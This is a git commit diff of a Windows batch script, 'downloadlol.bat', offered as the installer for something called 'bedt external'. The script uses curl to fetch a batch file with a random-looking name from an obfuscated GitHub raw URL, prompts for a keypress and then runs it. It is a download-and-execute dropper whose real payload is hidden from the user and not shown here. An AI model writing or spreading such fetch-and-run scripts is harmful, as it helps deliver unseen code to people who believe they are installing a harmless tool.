d2e0102594e8b436c4d091501b17b2489785ff17
aaronestaaron <mmaryanti778@gmail.com>
2025-11-01 18:40:37 +0700

    Update downloadlol.bat

--- downloadlol.bat
+++ downloadlol.bat
@@ -1,8 +1,10 @@
 @echo off
-cd %userprofile%\Downloads
+cd %userprofile%\Downloads\bedt_external
 curl -O https://raw.githubusercontent.com/aaronestaaron/pbvFmVVhTdTYdqhpSXRYADJWBDPFLjAOOYCsHveMAiarV.github.io/refs/heads/main/yMPoGoPIqKtssKSZAvJywLfRXhmgHBzPiDEkliwyYmdjY.bat
 echo bedt external has downloaded.
+echo opening bedt external...
+timeout /t 2 /nobreak >nul
 echo.
-echo press any key in ur keyboard to open it
+echo press any key in your keyboard to open bedt external
 pause >nul
 yMPoGoPIqKtssKSZAvJywLfRXhmgHBzPiDEkliwyYmdjY.bat
